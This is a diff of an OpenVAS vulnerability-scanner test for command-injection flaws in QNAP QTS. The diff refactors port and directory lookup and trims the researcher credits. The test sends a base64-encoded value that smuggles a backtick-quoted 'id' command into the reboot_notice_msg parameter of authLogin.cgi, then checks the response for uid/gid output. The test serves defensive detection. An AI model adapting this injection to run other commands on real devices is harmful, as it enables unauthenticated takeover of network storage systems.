@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_qnap_rce_20170313.nasl 11983 2018-10-19 10:04:45Z mmartin $
+# $Id: gb_qnap_rce_20170313.nasl 12260 2018-11-08 12:46:52Z cfischer $
 #
 # QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities
 #
@@ -25,16 +25,16 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = 'cpe:/h:qnap';
+CPE_PREFIX = 'cpe:/h:qnap';
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140238");
   script_bugtraq_id(97072, 97059);
   script_cve_id("CVE-2017-5227", "CVE-2017-6361", "CVE-2017-6360", "CVE-2017-6359");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_version("$Revision: 11983 $");
+  script_version("$Revision: 12260 $");
 
   script_name("QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities");
 
@@ -45,15 +45,15 @@ if (description)
   script_tag(name:"vuldetect", value:"Try to execute the `id` command by sending a special crafted HTTP GET request.");
   script_tag(name:"insight", value:"QTS 4.2.4 Build 20170313 includes security fixes for the following vulnerabilities:
 
-  - Configuration file vulnerability (CVE-2017-5227) reported by Pasquale Fiorillo of the cyber security company, ISGroup (www.isgroup.biz), a cyber security company, and Guido Oricchio of PCego (www.pcego.com), a system integrator
+  - Configuration file vulnerability (CVE-2017-5227)
 
-  - SQL injection, command injection, heap overflow, cross-site scripting, and three stack overflow vulnerabilities reported by Peter Kostiuk, a security researcher at Salesforce.com
+  - SQL injection, command injection, heap overflow, cross-site scripting, and three stack overflow vulnerabilities
 
-  - Three command injection vulnerabilities (CVE-2017-6361, CVE-2017-6360, and CVE-2017-6359) reported by Harry Sintonen of F-Secure
+  - Three command injection vulnerabilities (CVE-2017-6361, CVE-2017-6360, and CVE-2017-6359)
 
   - Access control vulnerability that would incorrectly restrict authorized user access to resources
 
-  - Two stack overflow vulnerabilities that could be exploited to execute malicious codes reported by Oliver Gruskovnjak, Security Researcher (Salesforce.com)
+  - Two stack overflow vulnerabilities that could be exploited to execute malicious codes reported
 
   - Clickjacking vulnerability that could be exploited to trick users into clicking malicious links
 
@@ -66,13 +66,15 @@ if (description)
   - LDAP anonymous directory access vulnerability that could be exploited to allow anonymous connections");
 
   script_tag(name:"solution", value:"Update to  QTS 4.2.4 Build 20170313 or newer.");
+
   script_tag(name:"summary", value:"QNAP QTS web user interface CGI binaries include Command Injection vulnerabilities. An unauthenticated attacker can execute
-arbitrary commands on the targeted device.");
+  arbitrary commands on the targeted device.");
+
   script_tag(name:"solution_type", value:"VendorFix");
 
   script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-10-19 12:04:45 +0200 (Fri, 19 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-08 13:46:52 +0100 (Thu, 08 Nov 2018) $");
   script_tag(name:"creation_date", value:"2017-04-07 11:52:09 +0200 (Fri, 07 Apr 2017)");
   script_category(ACT_GATHER_INFO);
   script_family("Web application abuses");
@@ -89,13 +91,19 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );
+if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, first_cpe_only:TRUE, service:"www" ) ) exit( 0 );
+
+port = infos["port"];
+CPE = infos["cpe"];
+
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
 t = ( unixtime() % 100000000 );
 
 rmessage = base64( str: 'QNAPVJBD' + t + '      Disconnect  14`(echo;id)>&2`' );
 
-url = '/cgi-bin/authLogin.cgi?reboot_notice_msg=' + rmessage;
+url = dir + '/cgi-bin/authLogin.cgi?reboot_notice_msg=' + rmessage;
 
 if( buf = http_vuln_check( port:port, url:url, pattern:'uid=[0-9]+.*gid=[0-9]+', check_header:TRUE ) )
 {
